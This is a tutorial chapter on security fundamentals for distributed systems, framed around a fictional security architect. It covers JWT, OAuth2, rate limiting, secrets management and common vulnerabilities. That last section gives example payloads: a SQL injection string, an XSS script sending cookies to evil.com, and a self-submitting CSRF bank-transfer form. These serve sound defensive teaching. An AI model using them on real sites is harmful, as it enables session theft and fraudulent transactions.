<a id="top"></a>

# 13. Security Fundamentals

> Tejas is a Telugu security architect who designs defense-in-depth for distributed systems. He learned security the hard way: his first production service got breached because someone committed a database password to Git. Now he treats every system like a fortress — multiple walls, each assuming the one before it has already fallen.

**"Security is like guarding a temple with seven gates,"** Tejas explains to his team. **"You don't just lock the front door and call it done. Every gate has its own lock, its own guard, its own purpose. Because one day, someone will find a way past one gate — and the next one must still hold."**

This chapter covers the full security stack: authentication, authorization, secrets management, encryption, rate limiting, and the common vulnerabilities that still bring down production systems every day.

<a id="toc"></a>

## Table of Contents

- [1. The Three Questions Every Security System Answers](#1-the-three-questions)
  - [Authentication vs Authorization — The Full Picture](#authn-vs-authz)
- [2. Sessions and Cookies — The Traditional Approach](#2-sessions-and-cookies)
- [3. JWT — Stateless Authentication](#3-jwt)
  - [Structure](#jwt-structure)
  - [Expiry and Refresh Tokens](#jwt-expiry-refresh)
  - [What NOT to Put in a JWT](#jwt-what-not)
- [4. OAuth2 — Let Google Vouch for You](#4-oauth2)
  - [The Authorization Code Flow](#oauth2-auth-code-flow)
- [5. API Keys — Authentication for Machines](#5-api-keys)
- [6. Rate Limiting — Protecting Your Service From Abuse](#6-rate-limiting)
  - [The Token Bucket Algorithm](#token-bucket)
  - [Rate Limit Dimensions](#rate-limit-dimensions)
  - [Where to Implement](#rate-limit-where)
- [7. HTTPS/TLS — All Traffic Encrypted](#7-https-tls)
- [8. Secrets Management — Never Hardcode Credentials](#8-secrets-management)
- [9. Common Vulnerabilities](#9-common-vulnerabilities)
  - [SQL Injection](#sql-injection)
  - [Cross-Site Scripting (XSS)](#xss)
  - [Cross-Site Request Forgery (CSRF)](#csrf)
- [10. Security is a Mindset, Not a Checklist](#10-security-mindset)
- [11. Quick Reference](#11-quick-reference)
- [12. Learning Priority](#12-learning-priority)
- [Summary](#summary)
- [Navigation](#navigation)

[Back to Top](#top)

<a id="1-the-three-questions"></a>

# 1. The Three Questions Every Security System Answers

Tejas draws three questions on the whiteboard every time he onboards a new engineer:

Every security decision in your system comes back to three questions:

1. **Who are you?** — Authentication (authn)
2. **What are you allowed to do?** — Authorization (authz)
3. **Is this request legitimate?** — Integrity, rate limiting, input validation

Before you read further, burn this distinction into your memory:

> **Authentication** = proving identity. "I am Alice."
> **Authorization** = checking permission. "Alice is allowed to view this order."

These are separate steps. Many bugs, and many breaches, come from conflating them.

```
    ┌──────────────────────────────────────────────────────┐
    │           THE SECURITY TRINITY                        │
    │                                                      │
    │   WHO ARE YOU?         Authentication (authn)         │
    │       │                                              │
    │       ▼                                              │
    │   WHAT CAN YOU DO?     Authorization (authz)         │
    │       │                                              │
    │       ▼                                              │
    │   IS THIS LEGIT?       Integrity / Validation        │
    │                                                      │
    └──────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="authn-vs-authz"></a>

## Authentication vs Authorization — The Full Picture

```
AUTHENTICATION (WHO ARE YOU?):
    User submits: username + password
    System checks: does this password match what we have for this user?
    Result: "Yes, this is Alice" ← identity confirmed

AUTHORIZATION (WHAT CAN ALICE DO?):
    Alice requests: DELETE /orders/99
    System checks: does Alice have permission to delete orders?
                   does order 99 belong to Alice?
    Result: "Alice can view her own orders, but not delete them" ← permission denied

COMMON MISTAKE:
    Only checking authentication ("is this a logged-in user?")
    but not authorization ("can THIS user do THIS thing?")

    Example bug:
        GET /api/orders/42  (Alice's order)
        GET /api/orders/43  (Bob's order)

        Bug: both return data if user is authenticated, regardless of ownership.
        Alice can see Bob's orders. This is called IDOR — Insecure Direct Object Reference.
```

Authentication happens once per session. Authorization happens on every request.

```
    ┌─────────────────────────────────────────────────────────────┐
    │   AUTHENTICATION              AUTHORIZATION                  │
    │                                                             │
    │   Happens: once per session   Happens: every request         │
    │   Question: "Who is this?"    Question: "Can they do this?"  │
    │   Result: identity            Result: allow / deny            │
    │                                                             │
    │   Without authz, authn alone = "Any logged-in user can      │
    │   do anything" → IDOR, privilege escalation, data leaks     │
    └─────────────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="2-sessions-and-cookies"></a>

# 2. Sessions and Cookies — The Traditional Approach

"Before JWTs existed," Tejas says, "every web app used server-side sessions. Think of it like a coat check at a restaurant — you hand over your coat, they give you a numbered ticket. Next time you show the ticket, they give you your coat back. The server remembers everything."

```
LOGIN FLOW:
    [Browser] -- POST /login (username, password) --> [Server]
    [Server]  -- validates credentials
              -- creates session: { session_id: "abc123", user_id: 42 }
              -- stores session in memory (or Redis)
              -- sends back: Set-Cookie: session_id=abc123
    [Browser] -- stores cookie

SUBSEQUENT REQUESTS:
    [Browser] -- GET /dashboard   Cookie: session_id=abc123 --> [Server]
    [Server]  -- looks up "abc123" in session store
              -- finds: user_id = 42
              -- serves dashboard for user 42

LOGOUT:
    [Server]  -- deletes "abc123" from session store
              -- future requests with this cookie: "session not found" → 401
```

This works. It's still used widely. The issue at scale:

**The server must store every active session.** With millions of users, that's millions of records in your session store. Every server in your cluster must have access to the same store (usually Redis).

```
Problem with server-side sessions at scale:

    [Server 1] ── has session store copy? no, uses [Redis]
    [Server 2] ── has session store copy? no, uses [Redis]
    [Server 3] ── has session store copy? no, uses [Redis]
                                                    ↑
                                        Redis becomes critical infrastructure.
                                        If it goes down, all users are logged out.
```

[Back to Top](#top)

<a id="3-jwt"></a>

# 3. JWT — Stateless Authentication

"Now imagine," Tejas continues, "instead of a coat check ticket, the restaurant stamps your coat itself with a tamper-proof seal. You keep the coat — no need to store anything. The stamp proves it's yours."

JWT (JSON Web Token) moves session state from the server to the token itself. The server stores nothing.

<a id="jwt-structure"></a>

## Structure

A JWT looks like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0MiwiZXhwIjoxNzM1Njg5NjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Three parts, separated by dots:
    HEADER.PAYLOAD.SIGNATURE

1. HEADER (base64 decoded):
    {
      "alg": "HS256",   ← signing algorithm
      "typ": "JWT"
    }

2. PAYLOAD (base64 decoded):
    {
      "user_id": 42,
      "email": "alice@example.com",
      "role": "admin",
      "exp": 1735689600   ← expiry timestamp (Unix)
    }

3. SIGNATURE:
    HMACSHA256(
        base64(header) + "." + base64(payload),
        SECRET_KEY
    )
```

The signature is the key. It's created using a secret key that only the server knows.

```
JWT VERIFICATION FLOW:

    [Browser] -- GET /dashboard  Authorization: Bearer <jwt> --> [Server]
    [Server]  -- decodes header + payload (anyone can do this, it's base64)
              -- recomputes signature using its SECRET_KEY
              -- if recomputed signature == signature in token → token is valid
              -- reads user_id from payload → serves request
              -- NO database lookup required ✓

TAMPERING ATTEMPT:
    Attacker changes payload: "role": "admin" → "role": "superadmin"
    Re-encodes the payload
    BUT: cannot recompute a valid signature without the SECRET_KEY
    Server recomputes signature → mismatch → token rejected ✓
```

"Signed by the server, readable by anyone, verified by anyone with the public key."

(Note: with asymmetric keys like RS256, the server signs with its private key and anyone can verify with the public key — useful for microservices.)

```
    ┌─────────────────────────────────────────────────────────┐
    │   SESSION COOKIE vs JWT                                  │
    │                                                         │
    │   Session Cookie:                                        │
    │     Server stores state → scales with Redis              │
    │     Easy to revoke → just delete from store              │
    │     Vulnerable to: session fixation, CSRF                │
    │                                                         │
    │   JWT:                                                   │
    │     Client stores state → server is stateless            │
    │     Hard to revoke → needs blocklist or short TTL        │
    │     Vulnerable to: token theft, replay attacks           │
    │                                                         │
    │   Tejas's rule: "Use JWTs for APIs, sessions for        │
    │   traditional web apps. Know the tradeoffs of both."     │
    └─────────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="jwt-expiry-refresh"></a>

## Expiry and Refresh Tokens

JWTs are signed but not revocable (without a server-side blocklist). So they should be short-lived.

```
ACCESS TOKEN:  expires in 15 minutes
    → short enough that a stolen token expires quickly

REFRESH TOKEN: expires in 7-30 days, stored more securely
    → used ONLY to get a new access token
    → can be revoked server-side (stored in DB)

FLOW:
    Login → server issues access_token (15min) + refresh_token (7 days)

    Every request: use access_token

    When access_token expires:
        POST /refresh  { refresh_token: "..." }
        → server validates refresh_token in DB
        → issues new access_token (15min)

    Logout:
        → server deletes refresh_token from DB
        → access_token will expire on its own in < 15min
```

[Back to Top](#top)

<a id="jwt-what-not"></a>

## What NOT to Put in a JWT

The payload is base64 encoded, not encrypted. **Anyone who intercepts the token can read it.**

```
DO NOT PUT IN JWT:
    ✗ passwords (obviously)
    ✗ credit card numbers
    ✗ PII beyond what's necessary (SSN, full address)
    ✗ anything you'd be embarrassed to have exposed

OKAY TO PUT IN JWT:
    ✓ user_id
    ✓ email (if user consents to it being in tokens)
    ✓ role (admin, user, viewer)
    ✓ permissions list
    ✓ expiry time
```

[Back to Top](#top)

<a id="4-oauth2"></a>

# 4. OAuth2 — Let Google Vouch for You

"Think of OAuth2 like a valet key," Tejas explains. "You give the valet a special key that can only start your car and drive it — it can't open the trunk or the glove box. OAuth2 lets users give apps limited access without handing over their full credentials."

OAuth2 solves a specific problem: **letting users grant third-party apps access to their data without sharing their password.**

"Sign in with Google" on Spotify is OAuth2. Spotify never sees your Google password.

<a id="oauth2-auth-code-flow"></a>

## The Authorization Code Flow

This is the main flow. Learn this one.

```
ACTORS:
    User          → the human
    Client        → the app wanting access (Spotify)
    Auth Server   → the trusted identity provider (Google)
    Resource Server → where the protected data lives (Google's APIs)

FLOW:
    1. User clicks "Sign in with Google" on Spotify

    2. Spotify redirects user to Google:
       https://accounts.google.com/oauth/authorize
           ?client_id=spotify_app_id
           &redirect_uri=https://spotify.com/callback
           &scope=email profile
           &response_type=code

    3. Google shows: "Spotify wants to read your name and email. Allow?"
       User clicks Allow.

    4. Google redirects user back to Spotify with a CODE:
       https://spotify.com/callback?code=AUTH_CODE_XYZ

    5. Spotify's server (not browser) calls Google server-to-server:
       POST https://oauth2.googleapis.com/token
           { code: AUTH_CODE_XYZ, client_secret: SPOTIFY_SECRET }

    6. Google responds with:
       { access_token: "...", refresh_token: "...", expires_in: 3600 }

    7. Spotify uses access_token to call Google APIs:
       GET https://www.googleapis.com/oauth2/v2/userinfo
           Authorization: Bearer access_token

    8. Google returns: { name: "Alice", email: "alice@gmail.com" }

    9. Spotify logs Alice in (or creates her account).
```

Why the `code` step? Why not give the access token directly in step 4?

Because step 4 goes through the user's browser (URL redirect), which is visible in browser history and logs. The short-lived code is exchanged server-to-server in step 5, where secrets are safe.

```
    ┌──────────────────────────────────────────────────────────────────┐
    │   OAUTH2 AUTHORIZATION CODE FLOW                                  │
    │                                                                  │
    │   [User/Browser]    [Spotify]       [Google Auth]    [Google API] │
    │        │                │                │               │        │
    │        │── click ──────▶│                │               │        │
    │        │                │── redirect ───▶│               │        │
    │        │◀── consent ────────────────────│               │        │
    │        │── allow ──────────────────────▶│               │        │
    │        │◀── code redirect ─────────────│               │        │
    │        │── code ───────▶│                │               │        │
    │        │                │── exchange ───▶│               │        │
    │        │                │◀── tokens ────│               │        │
    │        │                │── API call ────────────────────▶│       │
    │        │                │◀── user data ──────────────────│       │
    │        │◀── logged in ──│                │               │        │
    │                                                                  │
    └──────────────────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="5-api-keys"></a>

# 5. API Keys — Authentication for Machines

OAuth and JWTs are for users. When a backend service calls another backend service, or when you provide an API to developers, you often use **API keys**.

"API keys are like building access badges," Tejas says. "They identify which team is entering, can be revoked instantly if lost, and some only open certain doors."

```
DEVELOPER USAGE:
    curl https://api.openai.com/v1/chat/completions \
        -H "Authorization: Bearer sk-abc123..."
                                    ↑
                            This is an API key

API KEY PROPERTIES:
    - Long random string (32-64 characters)
    - Identifies the calling service or developer
    - Rotatable: if leaked, generate a new one and revoke the old
    - Can carry permissions: "this key can only read, not write"

STORAGE RULE:
    API keys are secrets. Never:
        ✗ Commit them to git
        ✗ Put them in client-side JavaScript
        ✗ Log them
        ✗ Send them in URL query params (they end up in logs)

    Always:
        ✓ Store in environment variables
        ✓ Use a secrets manager (AWS Secrets Manager, HashiCorp Vault)
        ✓ Rotate regularly
```

[Back to Top](#top)

<a id="6-rate-limiting"></a>

# 6. Rate Limiting — Protecting Your Service From Abuse

"Imagine a temple that allows unlimited visitors," Tejas says. "One day a thousand people rush in at once — the floor cracks, pillars stress, the whole structure is at risk. Rate limiting is the temple guard who says: only ten at a time."

Without rate limiting, a single bad actor (or a misconfigured client) can send millions of requests and exhaust your server for everyone else.

Rate limiting answers: "How many requests should I allow from this source in this time window?"

<a id="token-bucket"></a>

## The Token Bucket Algorithm

The most common algorithm. Imagine a bucket that holds tokens:

```
TOKEN BUCKET:

    Bucket capacity: 100 tokens
    Refill rate: 10 tokens/second

    Each request consumes 1 token.
    If bucket is empty: request is rejected (429 Too Many Requests).

    NORMAL USAGE:
    Second 1: user sends 5 requests → bucket: 100 - 5 + 10 = 105 (capped at 100)
    Second 2: user sends 5 requests → bucket: 100 - 5 + 10 = 100
    All allowed. ✓

    BURST:
    User sends 100 requests at once → bucket: 100 - 100 = 0. All allowed (burst absorbed).
    User sends 50 more → bucket: 0. All 50 rejected. 429.
    Over next 5 seconds: bucket refills to 50. Now they can send 50 more.
```

Token bucket allows short bursts while enforcing sustained rate limits. It's more user-friendly than a hard per-second limit.

```
    ┌────────────────────────────────────────────────────┐
    │   TOKEN BUCKET VISUALIZATION                        │
    │                                                    │
    │   Capacity: 100    Refill: 10/sec                  │
    │                                                    │
    │   ████████████████████████  ← Full (100 tokens)    │
    │   ████████████             ← After burst (50 left) │
    │   ██                       ← Nearly empty (10)     │
    │                            ← Empty → 429 rejected  │
    │   ████████████████████████  ← Refilled over time   │
    │                                                    │
    └────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="rate-limit-dimensions"></a>

## Rate Limit Dimensions

Rate limits can be applied at different levels of granularity:

```
Per-IP:      "Max 1000 requests/min per IP address"
             Defends against simple bots, DDoS

Per-user:    "Max 100 requests/min per authenticated user"
             Prevents abuse by specific accounts

Per-endpoint:"POST /login: max 5 attempts/min per IP"
             Defends against credential stuffing

Per-API-key: "Free tier: 100 req/day, Pro tier: 10,000 req/day"
             Business model enforcement
```

[Back to Top](#top)

<a id="rate-limit-where"></a>

## Where to Implement

```
OPTION 1: API Gateway (preferred)
    Rate limiting happens before the request reaches your app.
    Your app is never hit by rejected requests.
    Centralized: one place to configure all limits.

    [Client] → [API Gateway: rate check] → if ok → [Your App]
                        |
                    if over limit
                        |
                        v
                  429 Too Many Requests (returned immediately)

OPTION 2: Application Layer
    You implement rate limiting in your app code (using Redis).
    More flexible, but every service has to implement it.
    Good for business-logic rate limits (specific to your domain).
```

[Back to Top](#top)

<a id="7-https-tls"></a>

# 7. HTTPS/TLS — All Traffic Encrypted

"HTTP without TLS," Tejas warns, "is like shouting your password across a crowded room. Everyone between you and the server can hear it."

You should not be running anything user-facing over plain HTTP. The brief explanation:

```
HTTP (plain):
    [Browser] ── "my password is abc123" ──▶ [Server]
                        ↑
                 Anyone on the network path can read this.
                 Coffee shop WiFi. ISP. Anyone.

HTTPS (TLS encrypted):
    [Browser] ──[encrypted blob]──▶ [Server]
    The server has a TLS certificate that:
        1. Proves its identity ("Yes, this is really stripe.com, not a fake site")
        2. Establishes an encrypted channel (symmetric key negotiated via TLS handshake)

    Certificates are issued by Certificate Authorities (CAs): Let's Encrypt (free), DigiCert, etc.
    Browser trusts CA → trusts certificate → trusts the server.
```

Let's Encrypt provides free TLS certificates and automates renewal. There is no excuse for running HTTP in production.

```
    ┌─────────────────────────────────────────────────────────┐
    │   TLS HANDSHAKE (simplified)                             │
    │                                                         │
    │   [Browser]                          [Server]            │
    │       │── ClientHello (supported ciphers) ──▶│           │
    │       │◀── ServerHello (chosen cipher) ──────│           │
    │       │◀── Certificate (public key) ─────────│           │
    │       │── Key Exchange (pre-master secret) ──▶│          │
    │       │◀── Finished ─────────────────────────│           │
    │       │── Finished ──────────────────────────▶│          │
    │       │                                       │          │
    │       │◀═══ Encrypted traffic both ways ═════▶│          │
    │                                                         │
    └─────────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="8-secrets-management"></a>

# 8. Secrets Management — Never Hardcode Credentials

"My first breach," Tejas admits, "happened because someone pushed a .env file to GitHub. A bot scraped it within 4 minutes. Four minutes. That's how fast credentials get harvested from public repos."

A hardcoded database password in source code is like writing your house key on the front door. Secrets management externalizes credentials so they never touch version control and can be rotated without redeploying code.

**Secrets** include: database passwords, API keys, JWT signing keys, TLS private keys, OAuth client secrets, encryption keys.

**The wrong ways (never do these):**

```python
# WRONG: hardcoded in source code
DATABASE_URL = "postgresql://admin:s3cr3t@db.prod.example.com/mydb"

# WRONG: in .env file checked into git
# .env: SECRET_KEY=my-secret-key
```

**The right pattern — environment-based injection:**

```python
import os
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    database_url: str           # ← injected at runtime, never in code
    jwt_secret: str
    stripe_api_key: str

    class Config:
        env_file = ".env"       # ← .env in .gitignore for local dev only

settings = Settings()           # ← reads from environment or .env file
```

**AWS Secrets Manager pattern (production standard):**

```python
import boto3
import json

def get_secret(secret_name: str) -> dict:
    """Fetch secret from AWS Secrets Manager at startup."""
    client = boto3.client("secretsmanager", region_name="us-east-1")
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response["SecretString"])

# At application startup — fetch once, cache in memory:
db_creds = get_secret("prod/myapp/database")
DATABASE_URL = f"postgresql://{db_creds['username']}:{db_creds['password']}@..."
```

**HashiCorp Vault pattern (multi-cloud / on-premise):**

```python
import hvac

client = hvac.Client(url="https://vault.internal:8200", token=os.environ["VAULT_TOKEN"])

secret = client.secrets.kv.v2.read_secret_version(path="myapp/database")
db_password = secret["data"]["data"]["password"]
```

**Secrets rotation without downtime:**

```
1. Generate new secret version in Vault/Secrets Manager
2. Update all replicas to accept BOTH old and new secret (dual-accept period)
3. Rotate: switch to new secret in application
4. Revoke old secret after all instances confirmed migrated

Key: Never have a moment where no valid secret exists.
```

**Principles:**
- **Least privilege** — each service gets only the secrets it needs
- **Short TTL** — prefer short-lived credentials (AWS IAM roles) over long-lived passwords
- **Audit trail** — every secret access should be logged
- **Rotation** — rotate secrets on schedule, not just on breach
- **No secrets in logs** — mask credentials in structured logs

[Back to Top](#top)

<a id="9-common-vulnerabilities"></a>

# 9. Common Vulnerabilities

"OWASP Top 10 is your enemies list," Tejas says. "Know them the way a general knows the opposing army's playbook."

<a id="sql-injection"></a>

## SQL Injection

User input is treated as SQL code. Classic and still devastatingly common.

```
VULNERABLE CODE:
    query = "SELECT * FROM users WHERE username = '" + username + "'"

If username = "alice' OR '1'='1":
    query becomes: SELECT * FROM users WHERE username = 'alice' OR '1'='1'
    '1'='1' is always true → returns ALL users → attacker dumps your database

FIX: Use parameterized queries / prepared statements:
    query = "SELECT * FROM users WHERE username = ?"
    db.execute(query, [username])

    The input is treated as data, never as code.
    No ORM? Always use parameterized queries. Always.
```

[Back to Top](#top)

<a id="xss"></a>

## Cross-Site Scripting (XSS)

Attacker injects malicious JavaScript into a page that other users see.

```
VULNERABLE SCENARIO:
    Your site displays user-submitted comments.
    Attacker submits: <script>document.location='https://evil.com?c='+document.cookie</script>

    Your site renders this literally.
    Every user who views the comment executes the script.
    Their session cookies are sent to evil.com.
    Attacker now has their session. They're logged in as those users.

FIX:
    - Escape all user input before rendering in HTML.
      & → &amp;  < → &lt;  > → &gt;  " → &quot;
    - Use Content Security Policy (CSP) headers.
    - Use modern frameworks (React, Vue) that escape by default.
    - NEVER use innerHTML with user data.
```

[Back to Top](#top)

<a id="csrf"></a>

## Cross-Site Request Forgery (CSRF)

An attacker tricks a user's browser into making an authenticated request to your site without the user's knowledge.

```
SCENARIO:
    You're logged into your bank (bank.com).
    You visit evil.com (attacker's site).
    evil.com has a hidden form:
        <form action="https://bank.com/transfer" method="POST">
            <input name="amount" value="10000">
            <input name="to_account" value="attacker_account">
        </form>
        <script>document.forms[0].submit()</script>

    Your browser sends this POST to bank.com WITH your session cookie.
    bank.com thinks it's you. Transfer executes.

FIX:
    - CSRF tokens: server generates a unique, unpredictable token per form.
      Token must be included in every state-changing request.
      Attacker can't know the token, can't forge the request.

    - SameSite cookie attribute:
      Set-Cookie: session_id=abc123; SameSite=Strict
      Browser won't send this cookie on cross-site requests. ✓

    - Modern frameworks include CSRF protection by default.
      Don't disable it.
```

[Back to Top](#top)

<a id="10-security-mindset"></a>

# 10. Security is a Mindset, Not a Checklist

"You never finish securing a system," Tejas tells junior engineers. "You just make it expensive enough for attackers to move on to easier targets."

These fundamentals are your floor. Real-world security is:

- Keeping dependencies patched (check for CVEs).
- Principle of least privilege: give each service/user only the permissions it needs.
- Defense in depth: assume each layer will be breached, protect the next.
- Security reviews before shipping features that touch auth, payments, or user data.
- Logging and monitoring (Chapter 14) — so you know when you've been breached.

The goal isn't a perfect system. It's making attacks expensive enough that attackers move on.

```
    ┌─────────────────────────────────────────────────────────┐
    │   DEFENSE IN DEPTH — Tejas's Seven Gates                 │
    │                                                         │
    │   Gate 1: Network (firewall, VPC, security groups)       │
    │   Gate 2: Transport (TLS, mTLS between services)         │
    │   Gate 3: Authentication (JWT, OAuth2, MFA)              │
    │   Gate 4: Authorization (RBAC, ABAC, resource ownership) │
    │   Gate 5: Input validation (parameterized queries, CSP)  │
    │   Gate 6: Rate limiting (token bucket, per-user limits)  │
    │   Gate 7: Monitoring (audit logs, anomaly detection)     │
    │                                                         │
    │   Each gate assumes the one before it has fallen.        │
    │   That's defense in depth.                               │
    └─────────────────────────────────────────────────────────┘
```

[Back to Top](#top)

<a id="11-quick-reference"></a>

# 11. Quick Reference

| Concept        | One Line                                                       |
|----------------|----------------------------------------------------------------|
| Authentication | Proving who you are                                            |
| Authorization  | Checking what you're allowed to do                             |
| Session/Cookie | Stateful auth: server stores session, sends cookie to browser  |
| JWT            | Stateless auth: signed token, server stores nothing            |
| OAuth2         | Delegated auth: let Google/GitHub vouch for a user             |
| API Key        | Machine-to-machine auth: long secret string                    |
| Rate Limiting  | Max requests per time window, protect from abuse               |
| HTTPS/TLS      | Encrypt all traffic, verify server identity                    |
| SQL Injection  | User input treated as SQL — fix with parameterized queries     |
| XSS            | Injected JS runs in victim's browser — fix with escaping       |
| CSRF           | Browser tricked into making authenticated request — fix with tokens |

[Back to Top](#top)

<a id="12-learning-priority"></a>

# 12. Learning Priority

**Must Learn** — Core concept, daily use, interview essential:
authentication (OAuth2/JWT/API keys) · authorization checks · rate limiting · secrets management

**Should Learn** — Important for real projects, comes up regularly:
HTTPS/TLS · DDoS mitigation strategies · OWASP Top 10 categories · audit logging

**Good to Know** — Useful in specific situations, not always tested:
zero-trust architecture principles · JWT limitations (revocation complexity)

**Reference** — Know it exists, look up syntax when needed:
WAF configuration · mTLS · FIDO2/WebAuthn · SSO/SAML

[Back to Top](#top)

<a id="summary"></a>

# Summary

| Concept | Key Takeaway |
|---------|-------------|
| Authentication | Prove identity — use JWT for APIs, sessions for traditional web |
| Authorization | Check permissions on EVERY request — not just "is logged in" |
| JWT | Stateless, signed, short-lived — never store secrets in payload |
| OAuth2 | Delegate auth to trusted providers — learn Authorization Code flow |
| API Keys | Machine auth — treat as secrets, rotate regularly |
| Rate Limiting | Token bucket is the standard — implement at the gateway layer |
| TLS | Encrypt everything — no exceptions in production |
| Secrets Management | Never hardcode — use Vault or Secrets Manager with rotation |
| Vulnerabilities | Parameterize queries, escape output, use CSRF tokens |
| Defense in Depth | Assume each layer fails — protect the next one anyway |

[Back to Top](#top)

<a id="navigation"></a>

# Navigation

| | |
|---|---|
| Previous | [12 — Microservices](../12_microservices/theory.md) |
| Next | [14 — Observability](../14_observability/theory.md) |
| Home | [README.md](../README.md) |
| Interview | [interview.md](./interview.md) |
| Cheatsheet | [cheetsheet.md](./cheetsheet.md) |

[Back to Top](#top)
